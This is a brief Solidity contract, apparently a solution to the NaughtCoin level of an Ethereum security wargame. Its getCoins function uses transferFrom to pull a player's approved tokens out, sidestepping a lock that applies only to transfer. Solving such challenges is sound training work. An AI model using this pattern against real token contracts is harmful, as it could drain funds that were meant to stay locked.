//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "hardhat/console.sol";
import "./IERC20.sol";

interface NaughtCoin is IERC20 {
    function player() external view returns (address);
    function transfer(address _to, uint256 _value) override external returns (bool);
}

contract Naughty {

    function getCoins(address _nc, address _player, uint _amount) external {
        NaughtCoin(_nc).transferFrom(_player, address(this), _amount);
    }

    receive () external payable {}
}
